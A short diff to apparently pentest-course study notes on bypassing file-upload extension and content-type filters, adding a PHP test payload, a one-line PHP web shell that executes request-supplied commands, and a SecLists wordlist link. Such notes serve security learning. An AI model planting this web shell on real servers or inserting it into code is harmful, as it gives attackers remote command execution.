@@ -7,7 +7,14 @@
  then utilize one of the whitelist filter bypasses to bypass both extension filters.
 
  ---
-
+- Test payload:
+  ```php
+  <?php echo "Hello HTB"; ?>
+  ```
+- Basic web shell:
+  ```php
+  <?php system($_REQUEST['cmd']); ?>
+  ```
  - Web-all-content-types wordlist: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt
 
 - Descargamos la wordlist y filtramos sólo por content-type relacionados a imágenes:
